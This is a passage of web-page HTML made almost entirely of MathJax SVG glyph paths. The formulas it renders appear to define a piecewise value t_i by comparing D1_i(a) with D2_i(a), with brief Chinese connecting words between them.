-126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msubsup" transform="translate(6259.7,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(7524.3,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(7913.3,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(8442.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(8831.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(9498.1,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(10553.8,0)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g></g></g></svg></mjx-container></p><p>当<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.661ex;" xmlns="http://www.w3.org/2000/svg" width="14.653ex" height="2.548ex" role="img" focusable="false" viewBox="0 -833.9 6476.7 1126.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1264.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1653.6,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(2182.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2849.3,0)"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z"></path></g><g data-mml-node="msubsup" transform="translate(3905.1,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(5169.7,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(5558.7,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(6087.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>时，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.661ex;" xmlns="http://www.w3.org/2000/svg" width="25.009ex" height="2.548ex" role="img" focusable="false" viewBox="0 -833.9 11053.8 1126.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(394,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(965.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2021.5,0)"><path data-c="394" d="M51 0Q46 4 46 7Q46 9 215 357T388 709Q391 716 416 716Q439 716 444 709Q447 705 616 357T786 7Q786 4 781 0H51ZM507 344L384 596L137 92L383 91H630Q630 93 507 344Z"></path></g><g data-mml-node="mo" transform="translate(2854.5,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msubsup" transform="translate(3243.5,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(4508.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(4897.1,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(5426.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(5815.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msubsup" transform="translate(6259.7,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(7524.3,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(7913.3,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(8442.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(8831.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(9498.1,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(10553.8,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container></p><p>当<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.661ex;" xmlns="http://www.w3.org/2000/svg" width="14.653ex" height="2.548ex" role="img" focusable="false" viewBox="0 -833.9 6476.7 1126.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1264.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1653.6,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(2182.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2849.3,0)"><path data-c="3E" d="M84 520Q84 528 88 533T96 539L99 540Q106 540 253 471T544 334L687 265Q694 260 694 250T687 235Q685 233 395 96L107 -40H101Q83 -38 83 -20Q83 -19 83 -17Q82 -10 98 -1Q117 9 248 71Q326 108 378 132L626 250L378 368Q90 504 86 509Q84 513 84 520Z"></path></g><g data-mml-node="msubsup" transform="translate(3905.1,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(5169.7,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(5558.7,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 